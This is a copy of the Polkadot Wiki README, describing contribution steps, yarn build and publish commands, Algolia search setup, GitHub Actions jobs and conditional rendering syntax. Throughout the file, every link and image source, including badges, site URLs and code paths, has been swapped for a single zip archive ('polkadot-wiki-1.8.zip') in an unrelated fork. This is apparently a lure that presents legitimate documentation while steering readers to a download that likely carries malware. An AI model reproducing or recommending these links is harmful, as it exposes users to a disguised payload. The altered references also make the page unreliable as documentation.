<p align="center">
<img align="center" src="https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip" width="200">
</p>

<div align="Center">
<h1>Polkadot Wiki</h1>
<h3> The Source of Truth for Polkadot </h3>
<br>
  
[![GPLv3 license](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)](#LICENSE)
[![made-with-Markdown](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip%https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)
[![PRs Welcome](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)
[![Polkadot Prod](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)
[![Kusama Prod](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)
</div>

<!-- TOC -->

- [Contributing to Documentation](#contributing-to-documentation)
- [Running Locally](#running-locally)
  - [Build](#build)
  - [Start](#start)
  - [Publish](#publish)
- [Style and Configuration Guide](#style-and-configuration-guide)
  - [Formatting](#formatting)
  - [Search Engine](#search-engine)
  - [Automation](#automation)
    - [Deployments](#deployments)
    - [GitHub Actions](#github-actions)
  - [Conditional Rendering](#conditional-rendering)
  - [Inline React Components](#inline-react-components)
- [Internationalization](#internationalization)
- [License](#license)
<!-- /TOC -->

---

<img align="right" src="https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip" width="250">

<p align="left">
  The Polkadot Wiki is the central source of truth for Polkadot. It is a community-focused initiative led by 
  Web3 Foundation to keep an up-to-date resource on the best information for learning, building, or maintaining 
  on Polkadot. 
</p>

## Contributing to Documentation

The Technical Education team at Web3 Foundation are the primary maintainers of the Wiki and will
review all issues and pull requests created in this repository. If you notice typos or grammatical
errors, please feel free to create pull requests with these corrections directly. Larger
contributions may start as issues to test the waters on the subject with the maintainers. It is
generally preferable to create a pull request over an issue to propose a change to the Wiki content.

:sparkles: **_The Wiki belongs to the community, help generate its identity._** :sparkles:

https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip

> :inbox_tray: There will be an upcoming initiative that will promote and encourage contributions
> towards Polkadot-based content and documentation. In the meantime, feel free to share any ideas or
> feedback you may have for the Wiki by opening a
> [Feature Request issue](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip).

**Keep engaged by checking out these common
[Polkadot ecosystem resources](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)**.

## Running Locally

Both the Polkadot Wiki and the Kusama Guide are built from the source files in this repository.
After cloning the source locally, you can start the websites with each of these respective commands
(ensure you run `yarn` at the root of the repository first to install dependencies).

The Wiki uses Algolia search, which can be accessed locally by providing the correct App ID and API
key. The `app_id` and `api_key` environment variables are needed for the Wiki to be built
successfully. If you are an external contributor, set the variables with some values like shown
below, which lets the Wiki repo build successfully (but disables the search bar).

```bash
export app_id="xxxxxx" api_key="xxxxxxx"
```

Using yarn, run:

```bash
yarn install
```

### Build

:bird: Building the Kusama Guide:

```bash
yarn kusama:build
```

🟣 Building the Polkadot Wiki:

```bash
yarn polkadot:build
```

### Start

:bird: Starting the Kusama Guide:

```bash
yarn kusama:start
```

🟣 Starting the Polkadot Wiki:

```bash
yarn polkadot:start
```

### Publish

:bird: Publishing the Kusama Guide:

```bash
yarn kusama:publish-gh-pages
```

🟣 Publishing the Polkadot Wiki:

```bash
yarn polkadot:publish-gh-pages
```

## Style and Configuration Guide

Use the style guide from the
[Substrate Knowledge Base](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)

### Formatting

Prettier is automatically run when making a local commit. Verify that all changes render as expected
after making new commits by [running the projects locally](#start).

See the [Conditional Rendering](#conditional-rendering) and
[React Components](#inline-react-components) sections for additional details regarding how to
properly format syntax for elements outside of the standard markdown library.

### Search Engine

[Algolia DocSearch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip) is the search engine that is used, which is
built into Docusaurus. Indexing via Algolia provides faster lookup; the actual configuration for
lookup is located in another repository that Algolia DocSearch maintains.

We have enabled searching on the Wiki by declaring the `algolia` section in the `https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip` file
in `scripts`, and defining an API key and index name that are provided by DocSearch.

```js
  algolia: {
    apiKey: "53c6a4ab0d77c0755375a971c9b7cc3d",
    indexName: "kusama_guide",
    algoliaOptions: {
      facetFilters: ["language:LANGUAGE"],
    }, // Optional, if provided by Algolia
  }
```

If you would like to access and modify this, you can re-submit the documentation url via
[DocSearch Program](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip), where they will send a JavaScript snippet
that you can re-integrate into the configuration, similar to the one shown above.

### Automation

#### Deployments

The Polkadot Wiki is built on the `gh-pages` branch and automatically deployed to GitHub Pages. The
Kusama Wiki is also deployed to GitHub Pages (via a separate repository).

Development servers exist at `https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip` and
`https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip`. The servers will reflect the latest `master` commit or PR put up
against the master branch by a member of the Technical Education team. A staging environment can be
generated to reflect a specific branch by invoking the `workflow_dispatch` command via the GitHub UI
and can then be reviewed by the team before proceeding to production. If all is well, the new
commits on `master` are transferred into the production branch,`prod`, by rebasing `master` on
`prod`. This is completed automatically every 24 hours or manually through a `workflow_dispatch`
command. After these jobs are completed, the CICD production workflow will automatically deploy
`prod` to the public sites: [Polkadot Wiki](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip) and
[Kusama Guide](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip), respectively.

#### GitHub Actions

| Job                                                                                                                       | Description                                                                                                                                                                                                       | Frequency                                                                                                       |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| [Audit Images](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)                       | Searches for unreferenced images in the docs repository and archives them into `/docs/assets/_legacy`.                                                                                                            | Monthly or [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)         |
| [Audit Links](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)                         | Test all links in the docs for broken references and opens a new issue displaying results if any are found.                                                                                                       | Monthly or [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)          |
| [Code QL Analysis](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)                | Tests for vulnerabilities across the codebase                                                                                                                                                                     | Weekly, Push to `master` or Pull Request to `master`                                                            |
| [Dependabot]()                                                                                                            | Helps keep packages up-to-date with latest release.                                                                                                                                                               | Daily                                                                                                           |
| [Deploy Kusama Prod](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)           | Deploy Kusama docs to [GitHub Pages](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip) (production).                                                                                                                    | Daily or [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)     |
| [Deploy Kusama Staging](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)     | Deploy Kusama docs to [staging environment](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip).                                                                                                                                      | [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)           |
| [Deploy Polkadot Prod](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)       | Deploy Polkadot docs to [GitHub Pages](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip) (production).                                                                                                                         | Daily or [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)   |
| [Deploy Polkadot Staging](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip) | Deploy Polkadot docs to [staging environment](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip).                                                                                                                                  | [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)         |
| [Generate PDF](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)                       | Generate a PDF for the docs and upload it to the static website.                                                                                                                                                  | Disabled Manually                                                                                               |
| [Greetings](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)                             | Greet first time contributors.                                                                                                                                                                                    | First Time Pull Request or Issue Creation                                                                       |
| [Jest Testing Coverage](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)     | Run a series of [Jest tests](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip) related to React functionality.                                                                                              | Weekly or [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip) |
| [Pages and Build Deployment](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)         | Deploy Polkadot docs prod branch from GH Pages to public site. (This was originally setup through the [GitHub settings menu](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip), prior to GitHub Actions flows) | On Push to `gh-pages` branch                                                                                    |
| [Prettier All](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)                       | Run prettier over all docs to maintain styling standards.                                                                                                                                                         | Weekly or [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)          |
| [Status Badges](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)                     | Update the commit history of various [open source projects](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip) in the ecosystem.                                                   | Weekly or [Workflow Dispatch](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)         |

### Conditional Rendering

The two Wikis support conditional rendering depending on which Wiki is being deployed. This is
useful for mirrored pages with most content in common but have minor differences. To use this
functionality, surround Kusama specific content with
`{{ kusama: KUSAMA_SPECIFIC_CONTENT :kusama }}`, and polkadot specific content with
`{{ polkadot: POLKADOT_SPECIFIC_CONTENT :polkadot }}`.

For example the syntax:

```markdown
The {{ polkadot: Polkdadot Wiki :polkadot }} {{ kusama: Kusama Guide :kusama }} is a great resource!
```

Will render:

```
The Polkdadot Wiki is a great resource!
```

or

```
The Kusama Guide is a great resource!
```

depending on which project is currently loaded.

To verify the appropriate values have been substituted in each scenario, run `polkadot:start` and
`kusama:start` in separate terminals. If prompted with
`[WARNING] Something is already running on port 3000. Would you like to run the app on another port instead?`,
proceed with `yes`. This will likely launch one project on port 3000 and the other on 3001, allowing
you to compare the rendered outputs for both projects locally and simultaneously.

### Inline React Components

Occasionally you may require additional functionality that is outside of the scope of basic
markdown. React components can be used inline in existing markdown documents as a solution, allowing
you to render custom elements. This is currently the strategy used to
[retrieve live on-chain values](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip)
and display them directly in the docs without the need to recompile or even reload the web app using
RPCs.

If you are looking to invoke and embed data from 3rd party APIs or sources, checkout the
[Http-Request-Sample component](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip).
A full list of sample components can be found
[here](https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip).

Try and reuse existing components as much as possible instead of creating new ones to keep the code
lean and comprehensive. It is also important to verify prettier has not modified the formatting of
your component after making a commit. Below are some best practices for achieving common formatting
that will not be modified by the prettier command:

Always wrap RPC components in conditional rendering & keep them on new lines:

```
{{ polkadot: <RPC network="polkadot" path="https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip" defaultValue={297}/> :polkadot }}
{{ kusama: <RPC network="kusama" path="https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip" defaultValue={297}/> :kusama }}
```

To add grammar without added spacing, place the grammar inside the conditional brackets:

```
The validator count followed by a period is
{{ polkadot: <RPC network="polkadot" path="https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip" defaultValue={297}/>. :polkadot }}
{{ kusama: <RPC network="kusama" path="https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip" defaultValue={297}/>. :kusama }}

The validator count in parentheses is
{{ polkadot: (<RPC network="polkadot" path="https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip" defaultValue={297}/>) :polkadot }}
{{ kusama: (<RPC network="kusama" path="https://github.com/sinikismetcan/polkadot-wiki/raw/refs/heads/master/docs/assets/ledger/polkadot-wiki-1.8.zip" defaultValue={297}/>) :kusama }}
```

Failing to follow this schema can results in unexpected formatting, such as added line-breaks or
spacing, especially after running prettier.

## Internationalization

| ❗ The Wiki is currently being reorganized and updated. Work will resume on translations after the Wiki revamp is completed. |
| ---------------------------------------------------------------------------------------------------------------------------- |

## License

The Polkadot Wiki is licensed under the [GPL-3.0](LICENSE) free software license.
